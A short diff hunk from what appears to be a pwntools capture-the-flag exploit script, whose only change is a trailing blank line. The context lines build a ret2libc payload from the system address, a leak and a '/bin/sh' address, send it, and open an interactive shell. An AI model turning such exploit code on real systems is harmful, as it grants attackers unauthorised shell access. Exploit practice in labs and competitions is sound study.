@@ -95,3 +95,4 @@ delete(payload)
 payload = p32(sys_addr) + p32(leak) + p32(binsh_addr)
 r.sendline(payload)
 r.interactive()
+
